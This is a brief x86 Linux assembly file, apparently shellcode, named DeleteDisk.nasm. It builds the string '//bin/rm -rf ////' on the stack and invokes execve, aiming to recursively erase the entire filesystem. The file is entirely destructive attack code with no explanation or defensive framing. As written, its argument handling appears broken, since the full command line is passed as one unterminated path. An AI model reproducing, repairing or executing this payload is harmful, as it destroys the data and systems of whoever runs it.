; DeleteDisk.nasm
; Author: Ravehorn

global _start

section .text

_start:

    xor eax, eax
    push 0x2f2f2f2f
    push 0x2066722d
    push 0x6d722f6e
    push 0x69622f2f

    mov ebx, esp

    push eax
    mov edx, esp

    push ebx
    mov ecx, esp

    mov al, 0xb
    int 0x80